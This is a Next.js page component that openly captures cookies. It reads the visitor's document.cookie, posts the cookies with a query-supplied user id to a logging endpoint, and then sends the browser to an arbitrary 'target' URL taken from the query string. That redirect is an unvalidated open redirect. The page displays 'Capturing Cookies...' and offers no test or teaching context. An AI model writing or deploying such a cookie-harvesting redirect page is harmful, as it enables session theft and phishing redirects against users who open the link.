// app/collect/page.tsx
'use client';
import { useEffect, useState, Suspense } from 'react';
import { useSearchParams } from 'next/navigation';

function CollectComponent() {
  const searchParams = useSearchParams();
  const [status, setStatus] = useState('Collecting...');

  useEffect(() => {
    const target = searchParams.get('target');
    const id = searchParams.get('id');

    if (!target) return;

    // 1. Cookies read
    const myCookies = document.cookie;

    // 2. POST /api/log
    fetch('/api/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        userId: id,
        cookies: myCookies,
        timestamp: new Date().toISOString(),
      }),
    })
      .then(() => {
        setStatus('Logged! Redirecting...');
        setTimeout(() => {
          window.location.href = target;
        }, 1000);
      })
      .catch((err) => {
        console.error('Log error:', err);
        setStatus('Error logging.');
      });
  }, [searchParams]);

  return (
    <div style={{ display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center', height: '100vh' }}>
      <h2>🔄 Capturing Cookies...</h2>
      <p>{status}</p>
    </div>
  );
}

export default function Collect() {
  return (
    // Wrapping in Suspense is required by Next.js when using useSearchParams in a client component
    <Suspense fallback={<div>Loading...</div>}>
      <CollectComponent />
    </Suspense>
  );
}